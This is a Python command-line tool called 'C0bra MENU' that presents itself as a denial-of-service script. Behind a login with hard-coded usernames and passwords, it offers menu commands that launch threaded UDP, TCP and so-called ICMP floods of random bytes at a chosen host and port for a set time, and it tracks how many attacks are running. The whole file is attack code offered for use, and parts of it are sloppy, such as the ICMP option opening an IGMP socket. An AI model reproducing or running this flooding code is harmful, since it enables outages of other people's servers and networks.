#!/usr/bin/env python3
#-*- coding: utf-8 -*-

import sys
import socket
import time
import random
import threading
import getpass
import os


sys.stdout.write ("\x1b]2;C0bra MENU ~~ by fi$ic 2K20 ~~ \x07")


#script visuals are here#


udpflood = """\33[33m  
      ┬ ┬┌┬┐┌─┐
      │ │ ││├─┘  
      └─┘─┴┘┴
\33[33m """


tcpflood = """\33[33m 
      ┌┬┐┌─┐┌─┐
       │ │  ├─┘
       ┴ └─┘┴   
\33[33m """


icmpflood = """\33[33m  
     ┬┌─┐┌┬┐┌─┐
     ││  │││├─┘
     ┴└─┘┴ ┴┴ 
\33[33m """


about = """
\33[33m DENIAL OF SERVICE SCRIPT for VPS ~~ by fi$ic 2K20 ~~ C0bra MENU\33[33m
"""

info = """
\033[93m1. INFO\033[93m
\033[95m2. UDP FLOOD         [HOST PORT TIMEOUT SIZE] max 65500 bytes
3. TCP FLOOD         [HOST PORT TIMEOUT SIZE] max 65500 bytes
4. ICMP FLOOD        [HOST PORT TIMEOUT SIZE] max 65500 bytes\033[1;00m \033
\033[93m5. RUNNING ATTACKS
6. STATS 
7. EXIT  

CLS. CLEAR CONSOLE
STOPATTACKS. STOP ALL ATTACKS
COBRA. ABOUT THE PANEL
"""


banner = """
\033[95m
	  ▄████████  ▄██████▄  ▀█████████▄     ▄████████    ▄████████      
	  ███    ███ ███    ███   ███    ███   ███    ███   ███    ███      
	  ███    █▀  ███    ███   ███    ███   ███    ███   ███    ███      
	  ███        ███    ███  ▄███▄▄▄██▀   ▄███▄▄▄▄██▀   ███    ███      
	  ███        ███    ███ ▀▀███▀▀▀██▄  ▀█████████▄  ▀███████████      
	  ███    █▄  ███    ███   ███    ██▄   ███    ███   ███    ███   
	  ███    ███ ███    ███   ███    ███   ███    ███   ███    ███      
	  ████████▀   ▀██████▀  ▄█████████▀    ███    █▀    ███    █▀       
               		                        \033[95m            
\033[93m    
     ╔═══════════════╗ ╔═══════════════╗ ╔══════════════╗ ╔═══════════════╗
     ║    ╦╔╗╔╔═╗╔═╗ ║ ║    ┬ ┬┌┬┐┌─┐  ║ ║    ┌┬┐┌─┐┌─┐ ║ ║    ┬┌─┐┌┬┐┌─┐ ║
     ║ 1. ║║║║╠╣ ║ ║ ║ ║ 2. │ │ ││├─┘  ║ ║ 3.  │ │  ├─┘ ║ ║ 4. ││  │││├─┘ ║
     ║    ╩╝╚╝╚  ╚═╝ ║ ║    └─┘─┴┘┴    ║ ║     ┴ └─┘┴   ║ ║    ┴└─┘┴ ┴┴   ║
     ╚═══════════════╝ ╚═══════════════╝ ╚══════════════╝ ╚═══════════════╝
     ╔══════════════════════════╗ ╔════════════════════╗ ╔════════════════╗ 
     ║    ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═╔═╗ ║ ║    ╔═╗╔╦╗╔═╗╔╦╗╔═╗ ║ ║    ╔═╗═╗ ╦╦╔╦╗ ║ 
     ║ 5. ╠═╣ ║  ║ ╠═╣║  ╠╩╗╚═╗ ║ ║ 6. ╚═╗ ║ ╠═╣ ║ ╚═╗ ║ ║ 7. ║╣ ╔╩╦╝║ ║  ║ 
     ║    ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩╚═╝ ║ ║    ╚═╝ ╩ ╩ ╩ ╩ ╚═╝ ║ ║    ╚═╝╩ ╚═╩ ╩  ║ 
     ╚══════════════════════════╝ ╚════════════════════╝ ╚════════════════╝\033[93m
	 """


tattacks = 0
uaid = 0
taid = 0
iaid = 0
raid = 0
aid = 0
attack = True
udp = True
tcp = True
icmp = True


#ddos methods are here#


def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1


def tcpsender(host, port, timer, punch):
	global taid
	global tcp
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	taid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and tcp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	taid -= 1
	aid -= 1


def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

                ######################DDOS METHODS TESTING ZONE######################


               
			   
			   
			   
			    ######################DDOS METHODS TESTING ZONE######################

def main():

	global tattacks
	global uaid
	global iaid
	global taid
	global raid
	global aid
	global attack
	global udp
	global icmp
	

#functions are here#


	while True:

		choice = input("\033[95m[C0bra]\033[95m \033[93muser@{}: \033[93m".format (user))
		choices = choice.split(" ")[0]

		if choices == "info" or choices == "INFO" or choices == "1":
			print (info)
			main()
      
		elif choices == "udp" or choices == "UDP" or choices == "2":
				time.sleep(2)
				try:
					choices, host, port, timer, pack = choice.split(" ")
					socket.gethostbyname(host)
					print (udpflood)
					print ("\33[33m ATTACKING : {}\33[33m".format (host))
					print ("\33[33m ATTACKING : {}\33[33m".format (host))
					sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ ATTACKING {} \x07".format (host))
					print ()
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ()
					print ("\033[95m[C0bra] THE COMMAND {} REQUIRES AN ARGUMENT\033[95m".format (choices))
					print ()
					main()
				except socket.gaierror:
					print ()
					print ("\033[95m[C0bra] HOST: {} INVALID\033[95m".format (host))
					print ()
					main()

		elif choices == "tcp" or choices == "TCP" or choices == "3":
			time.sleep(2)
			try:
				choices, host, port, timer, pack = choice.split(" ")
				socket.gethostbyname(host)
				print (tcpflood)
				print ("\33[33m ATTACKING: {}\33[33m".format (host))
				print ("\33[33m ATTACKING: {}\33[33m".format (host))
				sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ ATTACKING {} \x07".format (host))
				print ()
				punch = random._urandom(int(pack))
				threading.Thread(target=tcpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ()
				print ("\033[95m[C0bra] THE COMMAND {} REQUIRES AN ARGUMENT\033[95m".format (choices))
				print ()
				main()
			except socket.gaierror:
				print ()
				print ("\033[95m[C0bra] HOST: {} INVALID\033[95m".format (host))
				print ()
				main()

		elif choices == "icmp" or choices == "ICMP" or choices == "4":
				time.sleep(2)
				try:
					choices, host, port, timer, pack = choice.split(" ")
					socket.gethostbyname(host)
					print (icmpflood)
					print ("\33[33m ATTACKING: {}\33[33m".format (host))
					print ("\33[33m ATTACKING: {}\33[33m".format (host))
					sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ ATTACKING {} \x07".format (host))
					print ()
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ()
					print ("\033[95m[C0bra] THE COMMAND {} REQUIRES AN ARGUMENT\033[95m".format (choices))
					print ()
					main()
				except socket.gaierror:
					print ()
					print ("\033[95m[C0bra] HOST: {} INVALID\033[95m".format (host))
					print ()
					main()

                  ######################DDOS METHODS TESTING ZONE######################					






                  ######################DDOS METHODS TESTING ZONE######################

		elif choices == "attacks" or choices == "ATTACKS" or choices == "5":
			print ()
			print ("\033[95m[C0bra]\033[95m UPD FLOOD ATTACKS RUNNING: {}".format (uaid))
			print ("\033[95m[C0bra]\033[95m TCP FLOOD ATTACKS RUNNING: {}".format (taid))			
			print ("\033[95m[C0bra]\033[95m ICMP FLOOD ATTACKS RUNNING: {}".format (iaid))
			print ("\033[95m[C0bra]\033[95m \033[93mTOTAL ATTACKS RUNNING: {}\033[93m".format (aid))
			print ()
			main()

		elif choices == "stats" or choices == "STATS" or choices == "6":
			print ()
			print ("\033[95m[C0bra]\033[95m \033[93mTOTAL ATTACKS PERFORMED: \033[93m{}".format (tattacks))
			print ()
			main()

		elif choices == "exit" or choices == "EXIT" or choices == "7" or choices == "logout" or choices == "LOGOUT":
			exit()

		elif choices == "cobra" or choices == "COBRA" or choices == "about" or choices == "ABOUT":
			print (about)
			main() 

		elif choices == "stopattacks" or choices == "STOPATTACKS":
			print ()
			print ("\033[93m STOPPING ALL ATTACKS\033[93m")
			print ("\033[93m STOPPING ALL ATTACKS\033[93m")
			sys.stdout.write ("\x1b]2;fi$ic MENU ~~ 2K20 ~~ user@{}\x07".format (user))
			print ()
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		elif choices == "cls" or choices == "CLS":
			print (banner)
			print ("                                                     \033[95mLOGGED IN AS user@{} \033[95m".format (user))
			main() 	

		else:
			print ()
			print ("\033[95m[C0bra] {} UNKNOWN COMMAND\033[95m".format(choices))
			print ()
			main()


#login form is here#

try:
	clear = "clear"
	os.system (clear)
	users = ["cobra", "fisic"]
	username = getpass.getpass ("\033[95m[C0bra]\033[95m \033[93mUSERNAME: \033[93m")
	if username in users:
		user = username
	else:
		print ("\033[95m[C0bra]\033[95m INCORRECT LOGIN")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C PRESSED")
	exit()
try:
	passwords = ["cobra", "fisic"]
	password = getpass.getpass ("\033[95m[C0bra]\033[95m \033[93mPASSWORD: \033[93m")
	
	if user == "cobra":
		if password == passwords[0]:
			print ("\033[95m[C0bra]\033[95m \33[32mCORRECT LOGIN - WELCOME user@{} \33[32m".format (user))
			time.sleep(2)	
			try:
				sys.stdout.write ("\x1b]2;C0bra MENU ~~ by fi$ic 2K20 ~~ user@{}\x07".format (user))
				print (banner)
				print ("                                                     \033[95mLOGGED IN AS user@{} \033[95m".format (user))
				main()
			except KeyboardInterrupt:
				print ()
				print ("\n\033[91m[C0bra]\033[00m CTRL-C HAS BEEN PRESSED, PRESS AGAIN TO EXIT")
				print ()
				main()

	if user == "fisic":
		if password == passwords[1]:
			print ("\033[95m[C0bra]\033[95m \33[32mCORRECT LOGIN - WELCOME user@{} \33[32m".format (user))
			time.sleep(2)	
			try:
				sys.stdout.write ("\x1b]2;C0bra MENU ~~ by fi$ic 2K20 ~~ user@{}\x07".format (user))
				print (banner)
				print ("                                                     \033[95mLOGGED IN AS user@{} \033[95m".format (user))
				main()
			except KeyboardInterrupt:
				print ()
				print ("\n\033[91m[C0bra]\033[00m CTRL-C HAS BEEN PRESSED, PRESS AGAIN TO EXIT")
				print ()
				main()
		else:
			print ("\033[95m[C0bra]\033[95m INCORRECT LOGIN")
			exit()

except KeyboardInterrupt:
	exit()
